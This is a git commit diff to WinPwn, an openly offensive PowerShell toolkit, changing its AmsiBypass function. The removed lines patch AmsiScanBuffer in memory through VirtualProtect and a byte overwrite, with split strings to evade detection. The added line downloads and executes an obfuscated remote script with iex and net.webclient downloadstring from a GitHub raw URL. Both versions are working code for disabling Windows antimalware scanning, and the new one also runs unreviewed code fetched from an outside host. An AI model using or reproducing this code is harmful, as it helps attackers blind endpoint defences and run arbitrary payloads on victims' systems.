0c2a8bcf979d2dda8d37fcefd11549ee9358d4b9
SecureThisShit <27858067+SecureThisShit@users.noreply.github.com>
2019-05-13 19:07:53 +0200

    Changed AmsiBypass

--- WinPwn_v0.7.ps1
+++ WinPwn_v0.7.ps1
@@ -15,32 +15,7 @@ function AmsiBypass
         License: BSD 3-Clause
     #>
     #Privilege Escalation Phase
-$Win32 = @"
-using System;
-using System.Runtime.InteropServices;
-
-public class Win32 {
-
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-
-}
-"@
-
-Add-Type $Win32
-
-$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
-$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
-$p = 0
-[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
-$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/amsi.ps1')
 }
 
 function dependencychecks
